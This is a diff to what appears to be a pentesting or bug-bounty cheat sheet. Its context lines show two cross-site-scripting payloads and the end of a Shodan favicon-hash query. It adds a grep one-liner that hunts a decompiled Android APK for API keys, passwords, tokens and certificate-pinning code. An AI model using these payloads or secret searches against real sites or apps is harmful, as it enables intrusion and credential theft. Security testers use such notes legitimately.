@@ -92,3 +92,9 @@ print('[+]shodan search query: http.favicon.hash:'+str(hash))
 xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
 "/><details/open/ontoggle=promt(1)>
 ```
+
+# One liner to extract sensitive info from android apk
+```
+grep -EHirn "accesskeyladmin|aes|api_keylapikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
+
+```
